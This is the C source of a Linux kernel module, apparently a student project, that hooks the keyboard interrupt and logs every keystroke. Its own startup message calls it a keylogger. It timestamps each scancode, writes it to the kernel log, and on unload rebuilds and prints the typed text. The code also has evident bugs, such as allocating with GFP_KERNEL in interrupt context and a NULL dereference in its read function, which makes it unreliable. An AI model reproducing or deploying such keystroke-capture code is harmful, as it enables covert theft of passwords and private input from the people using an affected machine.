#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/file.h> 
#include <linux/fcntl.h> 
#include <linux/syscalls.h>

#include <linux/kernel.h> 
#include <linux/init.h> 
#include <linux/module.h> 
#include <linux/syscalls.h> 
#include <linux/file.h> 
#include <linux/fs.h>
#include <linux/fcntl.h> 
#include <asm/uaccess.h> 

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mm.h>


#include "struct.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adam Taguirov <ataguiro@student.42.fr>");
MODULE_DESCRIPTION("Keyboard interrupt handler");

/*
   static struct           s_stroke {
   unsigned char   key;
   unsigned char   state;
   char            name[32];
   char            value;
   struct tm       time;
   struct s_stroke *next;
   };

   static struct s_stroke *stroke_head = NULL;
   */

static struct miscdevice kbhandler;

static int is_printable(unsigned char key)
{
	if (key >= 0x02 && key <= 0x29 && key != 0x0e && key != 0x1d)
		return 1;
	if (key >= 0x2b && key <= 0x35)
		return 1;
	if (key == 0x37 || key == 0x39)
		return 1;
	if (key >= 0x47 && key <= 0x53)
		return 1;
	return 0;
}

static char get_value(char *name, unsigned char scancode) {
	char ret = '?';

	if (is_printable(scancode) && !(scancode >= 0x47 && scancode <= 0x52))
		ret = name[0];
	switch (scancode) {
		case 0x01:
			ret = 27;
			break;
		case 0x0c:
			ret = '-';
			break;
		case 0x0d:
			ret = '=';
			break;
		case 0x0e:
			ret = 8;
			break;
		case 0x0f:
			ret = '\t';
			break;
		case 0x1b:
			ret = ']';
			break;
		case 0x1c:
			ret = '\n';
			break;
		case 0x1d:
			ret = '^';
			break;
		case 0x27:
			ret = ';';
			break;
		case 0x28:
			ret = '\'';
			break;
		case 0x29:
			ret = '`';
			break;
		case 0x2b:
			ret = '\\';
			break;
		case 0x35:
			ret = '/';
			break;
		case 0x37:
			ret = '*';
			break;
		case 0x39:
			ret = ' ';
			break;
		case 0x34:
			ret = '.';
			break;
	}
	return ret;
}

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	static unsigned char scancode;
	static char multi = 0;
	static char state = 0;
	static struct s_stroke *new, *tmp;
	static struct tm time;
	static struct timespec ts;

	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_KERNEL)))
		goto end;
	scancode = inb (0x60) % 256;
	if (scancode == 0xe0) {
		multi = 1;
		goto end;
	}
	if (scancode > 128) {
		scancode = scancode - 128;
		state = 0;
	}
	else
		state = 1;

	new->key = scancode;
	new->state = state;
	new->name = multi ? multi_scancodes[scancode] : simple_scancodes[scancode];
	new->value = get_value(new->name, scancode);
	new->multi = multi;
	getnstimeofday(&ts);
	time_to_tm(ts.tv_sec, 0, &time);
	new->time = time;
	new->next = NULL;
	if (!stroke_head)
		stroke_head = new;
	else {
		tmp = stroke_head;
		while (tmp->next)
			tmp = tmp->next;
		tmp->next = new;
	}
	printk("[%d:%d:%d] %s (%s%#x) %s\n", \
			new->time.tm_hour, new->time.tm_min, new->time.tm_sec, \
			new->name, \
			new->multi ? "0xe0, " : "", new->key, \
			new->state ? "pressed" : "released");
	multi = 0;

end:
	return (irq_handler_t) IRQ_HANDLED;
}

static ssize_t long_read(struct file *f, char __user *s, size_t n, loff_t *o)
{
	struct s_stroke *tmp;

	tmp = stroke_head;
	while (tmp)
		tmp = tmp->next;
	return simple_read_from_buffer(s, n, o, tmp->name, strlen(tmp->name));
}

struct file_operations kbfops = {
	.read = long_read
};

static int __init hello_init(void) {
	int ret;

	printk(KERN_INFO "Keyboard keylogger initialized !\n");
	kbhandler.minor = MISC_DYNAMIC_MINOR;
	kbhandler.name = "kbhandler";
	kbhandler.fops = &kbfops;

	ret = misc_register(&kbhandler);
	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
}

static void __exit hello_cleanup(void) {
	static struct s_stroke *tmp, *save;
	static char buffer[256] = {0};
	int n;

	printk(KERN_INFO "Destroying keylogger module.\n");
	tmp = stroke_head;
	while (tmp)
	{
		if (is_printable(tmp->key) && tmp->state == 1) {
			n = strlen(buffer);
			if (n >= 255) {
				printk("%s\n", buffer);
				memset(buffer, 0, 256);
			}
			buffer[n] = tmp->value;
			buffer[n + 1] = 0;
		}
		save = tmp->next;
		kfree(tmp);
		tmp = save;
	}
	printk("%s\n", buffer);
	misc_deregister(&kbhandler);
	free_irq(1, (void *)(irq_handler));
}

module_init(hello_init);
module_exit(hello_cleanup);
